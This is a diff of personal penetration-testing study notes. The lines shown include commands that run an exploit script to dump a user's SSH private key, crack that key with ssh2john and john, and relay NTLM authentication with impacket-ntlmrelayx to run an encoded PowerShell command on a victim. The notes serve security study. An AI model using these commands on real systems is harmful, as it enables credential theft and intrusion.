@@ -43,11 +43,14 @@
 
 **
 - possible to dump thru ``` ./50383.sh target.txt /home/alfred/.ssh/id_rsa ```
+- For ecdsa ssh-keygen private key name: ``` id_ecdsa ```
 
 ## john
 - if some pre-defined module not work, use john directly
-- create new rule to john.conf ``` sudo sh -c 'cat /home/hoidam/Downloads/ssh.rule >> /etc/john/john.conf'```
+- ssh to john for john eat ``` ssh2john id_rsa>xx.hash``` (Remember copy Beign --- Private key to --- End private key)
+- create new rule to john.conf ``` sudo sh -c 'cat /home/kali/Downloads/ssh.rule >> /etc/john/john.conf'```
 - run it ``` john --wordlist=ssh.passwords --rules=sshRules ssh.hash ```
+- [EASY] OR without rules ``` john --wordlist=/usr/share/wordlists/rockyou.txt xx.hash ``` 
 
 # NTLM v1
 - More like high priv users
@@ -88,7 +91,7 @@
 - Trigger call NTLM hash
 
 ## Forwarding the hash instill of crack since too hard
-- relay server for NTLM ``` impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..." ```
+- relay server for NTLM ``` impacket-ntlmrelayx --no-http-server -smb2support -t {target vicim ip} -c "powershell -enc JABjAGwAaQBlAG4AdA..." ```
 - use victim A to connect our rogue impacket server by dir \\xx\y
 - watch shell if have thing come
 
